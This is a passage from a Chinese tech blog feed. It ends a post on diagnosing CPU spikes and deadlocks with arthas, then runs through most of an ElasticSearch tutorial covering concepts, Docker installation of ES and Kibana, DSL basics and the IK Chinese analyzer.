     System.out.println(&quot;Thread 2: Holding lock 2 &amp; 1...&quot;);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">  </span><br><span class="line">        thread1.start();  </span><br><span class="line">        thread2.start();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将上面的代码上传到服务器，使用<code>nohuo java DeadlockDemo &amp;</code>运行起来</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/18.png"><br>接下来使用arthas进行分析</p><blockquote><p>这里选择arthas，不选择jstack是因为arthas更加的方便，它的功能也比jstack丰富</p></blockquote><p>输入thread就可以输出线程的统计信息，其中BLOCKED代表当前阻塞的线程数</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/19.png"><br>接下来，输入<code>thread -b</code>就可以看到线程具体的情况，在下面的图中已经准确的说明了代码在哪一行</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/20.png"></p><blockquote><p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p></blockquote><h2 id="7-小提示"><a href="#7-小提示" class="headerlink" title="7.小提示"></a>7.小提示</h2><p>工具的选择建议使用arthas，它还有很多的功能在实际中很有用</p><p>大家在面试的时候如果遇到cpu被打满该如何排查这样的问题，不要上来就是使用arthas来定位问题，我们的第一反应永远都是回滚版本，</p><p>因为在实际中代码的问题需要分析，不会像举例子这么简单，代码经过分析改动再上线，会浪费很多时间，而有的业务是绝对不允许这么操作的，比如电商，金融的业务，</p><p>所以在回答面试官的问题时候一定要先说回滚，在说解决办法.</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CPU打满 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>ES从入门到精通</title>
      
      <link href="/2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"/>
      <url>/2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="ElasticSearch-从入门到工业级使用"><a href="#ElasticSearch-从入门到工业级使用" class="headerlink" title="ElasticSearch 从入门到工业级使用"></a>ElasticSearch 从入门到工业级使用</h1><h2 id="1-1-什么是全文检索"><a href="#1-1-什么是全文检索" class="headerlink" title="1.1 什么是全文检索"></a>1.1 什么是全文检索</h2><p>将非结构化数据中的一部分信息提取出来，重新组织，使其变得有一定结构，然后对此有一定结构的数据进行搜索，从而达到搜索相对较快的目的。这部分从非结构化数据中提取出的然后重新组织的信息，我们称之索引。</p><p>例如：字典。字典的拼音表和部首检字表就相当于字典的索引，对每一个字的解释是非结构化的，如果字典没有音节表和部首检字表，在茫茫辞海中找一个字只能顺序扫描。</p><p>然而字的某些信息可以提取出来进行结构化处理，比如读音，就比较结构化，分声母和韵母，分别只有几种可以一一列举，于是将读音拿出来按一定的顺序排列，每一项读音都指向此字的详细解释的页数。</p><p>我们搜索时按结构化的拼音搜到读音，然后按其指向的页数，便可找到我们的非结构化数据——也即对字的解释。 这种先建立索引，再对索引进行搜索的过程就叫全文检索(Full-text Search)。</p><p>虽然创建索引的过程也是非常耗时的，但是索引一旦创建就可以多次使用，全文检索主要处理的是查询，所以耗时间创建索引是值得的。<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/1.png"><br>比如使用全文检索，所搜索“生化机”<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/2.png"><br>（有可能是手抖打错了，本来是生化危机），但是期望需要出来右侧的 4条 记录</p><p>有 4条 数据将每条数据进行词条拆分。</p><p>如“生化危机电影”拆成：生化、危机、电影 关键词（拆分结果与策略算法有关）每个关键词将对应包含此关键词的数据 ID搜索的时候，直接匹配这些关键词，就能拿到包含关键词的数据这个过程就叫做全文检索。</p><p>而词条拆分和词条对应的 ID 这个就是倒排索引的的基本原理</p><p><strong>对比数据库的缺陷</strong></p><p>mysql如果没有索引的情况下，共有100万条,按照之前的思路,其实就要扫描100万次，而且每次扫描,都需要匹配那个文本所有的字符，确认是否包含搜索的关键词，而且还不能将搜索词拆解开来进行检索<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/3.png"><br><strong>全文检索使用场景</strong></p><ul><li><p>维基百科，类似百度百科，牙膏，牙膏的维基百科，全文检索，高亮，搜索推荐</p></li><li><p>The Guardian（国外新闻网站），类似搜狐新闻，用户行为日志（点击，浏览，收藏，评论）+社交网络数据（对某某新闻的相关看法），数据分析，给到每篇新闻文章的作者，让他知道他的文章的公众反馈（好，坏，热门，垃圾，鄙视，崇拜）</p></li><li><p>Stack Overflow（国外的程序异常讨论论坛），IT问题，程序的报错，提交上去，有人会跟你讨论和回答，全文检索，搜索相关问题和答案，程序报错了，就会将报错信息粘贴到里面去，搜索有没有对应的答案</p></li><li><p>GitHub（开源代码管理），搜索上千亿行代码（5）电商网站，检索商品</p></li><li><p>日志数据分析，logstash采集日志，ES进行复杂的数据分析（ELK技术，elasticsearch+logstash+kibana）</p></li><li><p>商品价格监控网站，用户设定某商品的价格阈值，当低于该阈值的时候，发送通知消息给用户，比如说订阅牙膏的监控，如果高露洁牙膏的家庭套装低于50块钱，就通知我，我就去买</p></li><li><p>BI系统，商业智能，Business Intelligence。比如说有个大型商场集团，BI，分析一下某某区域最近3年的用户消费金额的趋势以及用户群体的组成构成，产出相关的数张报表，**区，最近3年，每年消费金额呈现100%的增长，而且用户群体85%是高级白领，开一个新商场。ES执行数据分析和挖掘，Kibana进行数据可视化</p></li></ul><h2 id="1-2-ES简介"><a href="#1-2-ES简介" class="headerlink" title="1.2 ES简介"></a>1.2 ES简介</h2><p>Elaticsearch，简称为es， es是一个开源的高扩展的分布式全文检索引擎，它可以近乎实时的存储、检索数据；本身扩展性很好，可以扩展到上百台服务器，处理PB级别的数据。</p><p>es也使用Java开发并使用Lucene作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。</p><p>Elasticsearch是面向文档(document oriented)的，这意味着它可以存储整个对象或文档(document)。然而它不仅仅是存储，还会索引(index)每个文档的内容使之可以被搜索。</p><p>在Elasticsearch中，你可以对文档（而非成行成列的数据）进行索引、搜索、排序、过滤。Elasticsearch比传统关系型数据库如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">Relational DB -&gt; Databases -&gt; Tables -&gt; Rows -&gt; Columns  </span><br><span class="line">Elasticsearch -&gt; Indices   -&gt; Types  -&gt; Documents -&gt; Fields  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Elasticsearch提供多种语言支持，其中Java的客户端为 Java REST Client 。</p><p>而它又分成两种：高级和低级的。高级包含更多的功能，如果把高级比作MyBatis的话，那么低级就相当于JDBC，是基于Netty和Server通讯相关。</p><h2 id="高级的-Client类似Mybatis是对于Low-Level的封装。1-3-ES基本概念"><a href="#高级的-Client类似Mybatis是对于Low-Level的封装。1-3-ES基本概念" class="headerlink" title="高级的 Client类似Mybatis是对于Low Level的封装。1.3 ES基本概念"></a>高级的 Client类似Mybatis是对于Low Level的封装。<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/4.png"><br>1.3 ES基本概念</h2><ol><li><strong>索引库</strong></li></ol><p>ElasticSearch将它的数据存储在一个或多个索引（index）中。</p><p>用SQL领域的术语来类比，索引就像数据库，可以向索引写入文档或者从索引中读取文档，并通过ElasticSearch内部使用Lucene将数据写入索引或从索引中检索数据。</p><p>Elastic Search使用倒排索引（Inverted Index）来做快速的全文搜索，这点与数据库不同，一般数据库 的索引，用B+Tree来实现。</p><table><thead><tr><th><strong>Relational DB</strong></th><th><strong>Databases</strong></th><th><strong>Tables</strong></th><th><strong>表结构</strong></th><th><strong>Rows</strong></th><th><strong>Columns</strong></th></tr></thead><tbody><tr><td>ElasticSearch</td><td>Indices</td><td>Types</td><td>映射mapping</td><td>Documents</td><td>Fields 字段</td></tr></tbody></table><p>索引库就是存储索引的保存在磁盘上的一系列的文件。里面存储了建立好的索引信息以及文档对象。一个索引库相当于数据库中的一张表。<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/5.png"><br>2.  <strong>document对象</strong></p><p>获取原始内容的目的是为了索引，在索引前需要将原始内容创建成文档（Document），文档中包括一个一个的域（Field），域中存储内容。</p><p>每个文档都有一个唯一的编号，就是文档id。</p><p>document对象相当于表中的一条记录。</p><p>文档（document）是ElasticSearch中的主要实体。</p><p>对所有使用ElasticSearch的案例来说，他们最终都可以归结为对文档的搜索。</p><p>文档由字段构成。</p><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/6.png"><br>3.  <strong>field对象</strong></p><p>如果我们把document看做是数据库中一条记录的话，field相当于是记录中的字段。field是索引库中存储数据的最小单位。field的数据类型大致可以分为数值类型和文本类型，一般需要查询的字段都是文本类型的，field的还有如下属性：</p><ul><li><p>是否分词：是否对域的内容进行分词处理。前提是我们要对域的内容进行查询。</p></li><li><p>是否索引：将Field分析后的词或整个Field值进行索引，只有索引方可搜索到。比如：商品名称、商品简介分析后进行索引，订单号、身份证号不用分词但也要索引，这些将来都要作为查询条件。</p></li><li><p>是否存储：将Field值存储在文档中，存储在文档中的Field才可以从Document中获取。比如：商品名称、订单号，凡是将来要从Document中获取的Field都要存储。</p></li></ul><ol start="4"><li><strong>term对象</strong></li></ol><p>从文档对象中拆分出来的每个单词叫做一个Term，不同的域中拆分出来的相同的单词是不同的term。</p><p>term中包含两部分一部分是文档的域名，另一部分是单词的内容。</p><p>term是创建索引的关键词对象。</p><ol start="8"><li><strong>类型（type）</strong></li></ol><p>每个文档都有与之对应的类型（type）定义。</p><p>这允许用户在一个索引中存储多种文档类型，并为不同文 档提供类型提供不同的映射。 type的版本迭代</p><ul><li><p>5.x及以前版本一个index有一个或者多个type</p></li><li><p>6.X版本一个index只有一个index</p></li><li><p>7.X版本移除了type，type相关的所有内容全部变成Deprecated，为了兼容升级和过渡，所有的7.X版本es数据写入后type字段都默认被置为_doc</p></li><li><p>8.X版本完全废弃type</p></li></ul><ol start="9"><li><strong>映射（mapping）</strong></li></ol><p>mapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分析器、是否被索引等等，这些都是映射里面可以设置的，其它就是处理es里面数据的一些使用规则设置也叫做映射，按着最优规则处理数据对性能提高很大，因此才需要建立映射，并且需要思考如何建立映射才能对性能更好。</p><ol start="10"><li><strong>分片（shards）</strong></li></ol><p>代表索引分片，es可以把一个完整的索引分成多个分片，这样的好处是可以把一个大的索引拆分成多个，分布到不同的节点上。构成分布式搜索。分片的数量只能在索引创建前指定，并且索引创建后不能更改。</p><p>5.X默认不能通过配置文件定义分片 ES默认5:1 5个主分片，每个分片，1个副本分片</p><ol start="11"><li><strong>副本（replicas）</strong></li></ol><p>代表索引副本，es可以设置多个索引的副本，副本的作用：</p><ul><li><p>提高系统的容错性，当个某个节点某个分片损坏或丢失时可以从副本中恢复。</p></li><li><p>是提高es的查询效率，es会自动对搜索请求进行负载均衡。</p></li></ul><ol start="12"><li><strong>集群（cluster）</strong></li></ol><p>代表一个集群，集群中有多个节点（node），其中有一个为主节点，这个主节点是可以通过选举产生的，主从节点是对于集群内部来说的。es的一个概念就是去中心化，字面上理解就是无中心节点，这是对于集群外部来说的，因为从外部来看es集群，在逻辑上是个整体，你与任何一个节点的通信和与整个es集群通信是等价的。</p><h1 id="2-安装和DSL的使用"><a href="#2-安装和DSL的使用" class="headerlink" title="2 安装和DSL的使用"></a>2 安装和DSL的使用</h1><h2 id="2-1-安装ES"><a href="#2-1-安装ES" class="headerlink" title="2.1 安装ES"></a>2.1 安装ES</h2><p>使用docker安装单点Elasticsearch，步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker network create elastic  </span><br><span class="line">docker pull docker.elastic.co/elasticsearch/elasticsearch:7.15.2  </span><br><span class="line">docker run -di --name es --net elastic -p 192.168.56.181:9200:9200 -p 192.168.56.181:9300:9300 -e &quot;discovery.type=single-node&quot; docker.elastic.co/elasticsearch/elasticsearch:7.15.2  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>9200端口(Web管理平台端口)  9300(服务默认端口)</p><p>浏览器输入地址访问：<code>http://192.168.56.181:9200/</code></p><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/7.png"><br>3.  <strong>系统参数配置</strong></p><p>es发现重启启动失败了，这时什么原因呢？</p><p>这与我们刚才修改的配置有关，因为elasticsearch在启动的时候会进行一些检查，比如最多打开的文件的个数以及虚拟内存区域数量等等，如果你放开了此配置，意味着需要打开更多的文件以及虚拟内存，所以我们还需要系统调优 修改vi &#x2F;etc&#x2F;security&#x2F;limits.conf ，追加内容 (nofile是单个进程允许打开的最大文件个数 soft nofile 是软限制 hard nofile是硬限制 )</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">\* soft nofile 65536  </span><br><span class="line">\* hard nofile 65536  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改vi &#x2F;etc&#x2F;sysctl.conf，追加内容 (限制一个进程可以拥有的VMA(虚拟内存区域)的数量 )</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">vm.max\_map\_count\=655360  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行下面命令 修改内核参数马上生效</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">sysctl \-p  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重新启动虚拟机，再次启动容器，发现已经可以启动并远程访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">reboot  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-2-安装Kibana"><a href="#2-2-安装Kibana" class="headerlink" title="2.2 安装Kibana"></a>2.2 安装Kibana</h2><p>Kibana是一个针对Elasticsearch的开源分析及可视化平台，用来搜索、查看交互存储在Elasticsearch索引中的数据。使用Kibana，可以通过各种图表进行高级数据分析及展示。</p><p>Kibana让海量数据更容易理解。它操作简单，基于浏览器的用户界面可以快速创建仪表板（dashboard）实时显示Elasticsearch查询动态。</p><p>设置Kibana非常简单。</p><p>无需编码或者额外的基础架构，几分钟内就可以完成Kibana安装并启动Elasticsearch索引监测。</p><p>Query DSL是一个Java开源框架用于构建类型安全的SQL查询语句。</p><p>采用API代替传统的拼接字符串来构造查询语句。</p><p>目前QueryDSL支持的平台包括JPA，JDO，SQL，Java Collections，RDF，Lucene，Hibernate Search。elasticsearch提供了一整套基于JSON的DSL语言来定义查询。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker pull docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class="line">docker run -di --name kb --net elastic -p 192.168.56.181:5601:5601 -e &quot;ELASTICSEARCH\_HOSTS=http://192.168.56.181:9200&quot; docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>拉取kibana镜像</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker pull docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>安装kibana容器</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -di --name kb --net elastic -p 192.168.56.181:5601:5601 -e &quot;ELASTICSEARCH\_HOSTS=http://192.168.56.181:9200&quot; docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>修改配置文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker exec -it kb /bin/bash  </span><br><span class="line">vi config/kibana.yml  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>好像不改也可以，因为上面docker启动有了ES地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#修改elasticsarch.hosts: \[ &quot;http://elasticsearch:9200&quot; \]，如下：  </span><br><span class="line">elasticsearch.hosts: \[ &quot;http://192.168.56.181:9200&quot; \]  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-3通过脚本一键启动ES"><a href="#2-3通过脚本一键启动ES" class="headerlink" title="2.3通过脚本一键启动ES"></a>2.3通过脚本一键启动ES</h2><p>通过提供的脚本，和配置文件，可以一键启动ES</p><p>这个非常的容易，非常的轻量级。 具体请参见视频。</p><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/8.png"><br>启动完之后的效果</p><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/9.png"><br>接下来，可以访问es</p><p><a href="http://cdh1:9200/">http://cdh1:9200</a></p><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/10.png"><br>接下来，可以访问 Kibana</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">默认的地址     http://cdh1:5601               </span><br><span class="line">  </span><br><span class="line">的一键环境地址     http://cdh1:5601             </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-4使用-DSL-操作ES"><a href="#2-4使用-DSL-操作ES" class="headerlink" title="2.4使用 DSL 操作ES"></a><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/11.png"><br>2.4使用 DSL 操作ES</h2><p>在 Kibana的开发工具界面，可以执行 DSL 去进行ES的查询。</p><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/12.png"><br>es开发，常常需要用到DSL语法去定义好 es的查询语句。</p><p>就像 myql开发，需要提前定义好 sql语句，并进行sql 的执行和测试一样。</p><h3 id="2-4-1DSL-定义基本介绍"><a href="#2-4-1DSL-定义基本介绍" class="headerlink" title="2.4.1DSL 定义基本介绍"></a>2.4.1DSL 定义基本介绍</h3><h5 id="DSL（Domain-Specific-Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。"><a href="#DSL（Domain-Specific-Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。" class="headerlink" title="DSL（Domain Specific Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。"></a>DSL（Domain Specific Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。</h5><p>在Elasticsearch中，可用DSL语法来定义查询和过滤条件，以及执行聚合操作。</p><p>DSL语法 具有JSON格式，因此它非常易于阅读和编写。</p><h3 id="2-4-2DSL-定义语法说明"><a href="#2-4-2DSL-定义语法说明" class="headerlink" title="2.4.2DSL 定义语法说明"></a>2.4.2DSL 定义语法说明</h3><h6 id="（1）关键字-Keywords"><a href="#（1）关键字-Keywords" class="headerlink" title="（1）关键字(Keywords)"></a>（1）关键字(Keywords)</h6><ul><li><p>DSL通常会定义一组关键字，这些关键字具有特殊含义，并在DSL中起到关键作用。关键字通常不能用作标识符或变量名。</p></li><li><p>示例：在一个简单的数学表达式DSL中，可能会定义关键字如”add”、”subtract”等来表示加法和减法操作。</p></li></ul><h6 id="（2）标识符-Identifiers"><a href="#（2）标识符-Identifiers" class="headerlink" title="（2）标识符(Identifiers)"></a>（2）标识符(Identifiers)</h6><ul><li><p>标识符是用来表示变量名、函数名或其他用户定义的名称。它们需要遵循特定的命名规则，如大小写敏感、不包含特殊字符等。</p></li><li><p>示例：在一个配置文件DSL中，可以使用标识符来表示不同的配置项，如”username”、”password”等。</p></li></ul><h6 id="（3）表达式-Expressions"><a href="#（3）表达式-Expressions" class="headerlink" title="（3）表达式(Expressions)"></a>（3）表达式(Expressions)</h6><ul><li><p>表达式是DSL中最基本的构建块，用于计算或产生某个值。表达式可以包括变量、常量、运算符和函数调用。</p></li><li><p>示例：在一个数学表达式DSL中，可以将”2 + 3”作为一个表达式，计算结果为5。</p></li></ul><h6 id="（4）运算符-Operators"><a href="#（4）运算符-Operators" class="headerlink" title="（4）运算符(Operators)"></a>（4）运算符(Operators)</h6><ul><li><p>运算符用于执行各种操作，例如算术运算、逻辑运算、比较运算等。DSL中的运算符根据所涉及的领域和需求而定。</p></li><li><p>示例：在一个布尔表达式DSL中，可以定义逻辑运算符如”and”、”or”用于连接多个条件。</p></li></ul><h6 id="（5）函数调用-Function-Calls"><a href="#（5）函数调用-Function-Calls" class="headerlink" title="（5）函数调用(Function Calls)"></a>（5）函数调用(Function Calls)</h6><ul><li><p>DSL可以支持函数调用，允许用户使用预定义或自定义的函数来完成特定的任务。函数调用通常由函数名称和传递给函数的参数组成。</p></li><li><p>示例：在一个日期处理DSL中，可以定义函数”formatDate(date, format)”，其中”date”是日期值，”format”是日期格式字符串。</p></li></ul><h6 id="（6）控制流-Control-Flow"><a href="#（6）控制流-Control-Flow" class="headerlink" title="（6）控制流(Control Flow)"></a>（6）控制流(Control Flow)</h6><ul><li><p>控制流语句用于控制程序的执行流程，例如条件语句(if-else)和循环语句(while、for)等。DSL可以支持特定的控制流语句来满足领域特定需求。</p></li><li><p>示例：在一个工作流程DSL中，可以使用条件语句来判断某个条件是否满足并执行相应的操作。</p></li></ul><h6 id="（7）注释-Comments"><a href="#（7）注释-Comments" class="headerlink" title="（7）注释(Comments)"></a>（7）注释(Comments)</h6><ul><li><p>注释用于向DSL代码添加说明性文本，以便开发人员理解和维护代码。注释通常不会被编译或执行，仅用于阅读目的。</p></li><li><p>示例：在DSL中，可以使用双斜杠(&#x2F;&#x2F;)或特定的注释标记来添加注释，如：“&#x2F;&#x2F; 这是一个示例注释”。</p></li></ul><h3 id="2-4-3DSL常见语法"><a href="#2-4-3DSL常见语法" class="headerlink" title="2.4.3DSL常见语法"></a>2.4.3DSL常见语法</h3><blockquote><p>文章实在太长， 这里省略了500字+， 省略的内容请参见的免费电子书 PDF版本《ES学习圣经：从0到1, 精通 ElasticSearch 工业级使用 》</p></blockquote><h1 id="3-ES-的分词器"><a href="#3-ES-的分词器" class="headerlink" title="3 ES 的分词器"></a>3 ES 的分词器</h1><h2 id="3-1-倒排索引"><a href="#3-1-倒排索引" class="headerlink" title="3.1 倒排索引"></a>3.1 倒排索引</h2><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/13.png"><br>如上图</p><ul><li><p>左边的是正排索引，通过文档的id如查找文档的内容</p></li><li><p>右边的是倒排索引，通过单词统计次数以及文档的位置，</p></li></ul><p>如Elasticsearch出现的次数为3，在id&#x3D;1，id&#x3D;2，id&#x3D;3都出现过，且位置分别为1，0，0</p><h2 id="3-2-默认分词器"><a href="#3-2-默认分词器" class="headerlink" title="3.2 默认分词器"></a>3.2 默认分词器</h2><p>默认分词器对于英文分词的效果如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">POST /\_analyze  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;text&quot;: &quot;You can use Elasticsearch to store, search, and manage data&quot;,  </span><br><span class="line">  &quot;analyzer&quot;: &quot;standard&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/14.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">POST /\_analyze  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;text&quot;: &quot;中华人民共和国人民大会堂&quot;,  </span><br><span class="line">  &quot;analyzer&quot;: &quot;standard&quot;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-3-中文分词"><a href="#3-3-中文分词" class="headerlink" title="3.3 中文分词"></a><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/15.png"><br>3.3 中文分词</h2><p>中文分词是中文文本处理的一个基础步骤，也是中文人机自然语言交互的基础模块。</p><p>不同于英文的是，中文句子中没有词的界限，因此在进行中文自然语言处理时，通常需要先进行分词，</p><p>分词效果将直接影响词性、句法树等模块的效果。</p><p>当然分词只是一个工具，场景不同，要求也不同。</p><p>部分分词工具如下：</p><ul><li><p>中科院计算所NLPIR <a href="http://ictclas.nlpir.org/nlpir/">http://ictclas.nlpir.org/nlpir/</a></p></li><li><p>ansj分词器 <a href="https://github.com/NLPchina/ansj/_seg">https://github.com/NLPchina/ansj\_seg</a></p></li><li><p>哈工大的LTP <a href="https://github.com/HIT-SCIR/ltp">https://github.com/HIT-SCIR/ltp</a></p></li><li><p>清华大学THULAC <a href="https://github.com/thunlp/THULAC">https://github.com/thunlp/THULAC</a></p></li><li><p>斯坦福分词器 <a href="https://nlp.stanford.edu/software/segmenter.shtml">https://nlp.stanford.edu/software/segmenter.shtml</a></p></li><li><p>Hanlp分词器 <a href="https://github.com/hankcs/HanLP">https://github.com/hankcs/HanLP</a></p></li><li><p>结巴分词 <a href="https://github.com/yanyiwu/cppjieba">https://github.com/yanyiwu/cppjieba</a></p></li><li><p>KCWS分词器(字嵌入+Bi-LSTM+CRF) <a href="https://github.com/koth/kcws">https://github.com/koth/kcws</a></p></li><li><p>ZPar <a href="https://github.com/frcchang/zpar/releases">https://github.com/frcchang/zpar/releases</a></p></li><li><p>IKAnalyzer <a href="https://github.com/wks/ik-analyzer">https://github.com/wks/ik-analyzer</a></p></li></ul><h2 id="3-4-IK分词器"><a href="#3-4-IK分词器" class="headerlink" title="3.4 IK分词器"></a>3.4 IK分词器</h2><p>IK分词器下载地址<a href="https://github.com/medcl/elasticsearch-analysis-ik/releases">https://github.com/medcl/elasticsearch-analysis-ik/releases</a> 将ik分词器上传到服务器上，然后解压，并改名字为ik</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir ~/ik  </span><br><span class="line">mv elasticsearch-analysis-ik-7.15.2.zip ~/ik  </span><br><span class="line">unzip elasticsearch-analysis-ik-7.15.2.zip  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将ik目录拷贝到docker容器的plugins目录下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker cp ./ik es:/usr/share/elasticsearch/plugins  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>特别说明，的一键启动版本，已经默认戴上了IK分词器</p></blockquote><p>IKAnalyzer是一个开源的，基于java语言开发的轻量级的中文分词工具包，IK分词器分为两种模式</p><ol><li><strong>ik_max_word：会将文本做最细粒度的拆分</strong></li></ol><p>比如会将“中华人民共和国人民大会堂”拆分为“中华人民共和国、中华人民、中华、华人、人民共和国、人民、共和国、大会堂、大会、会堂等词语。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">POST /\_analyze  </span><br><span class="line">&#123;  </span><br><span class="line">&quot;text&quot;:&quot;中华人民共和国人民大会堂&quot;,  </span><br><span class="line">&quot;analyzer&quot;:&quot;ik\_max\_word&quot;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/16.png"><br>2.  <strong>ik_smart：会做最粗粒度的拆分</strong></p><p>比如会将“中华人民共和国人民大会堂”拆分为中华人民共和国、人民大会堂。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">POST /\_analyze  </span><br><span class="line">&#123;  </span><br><span 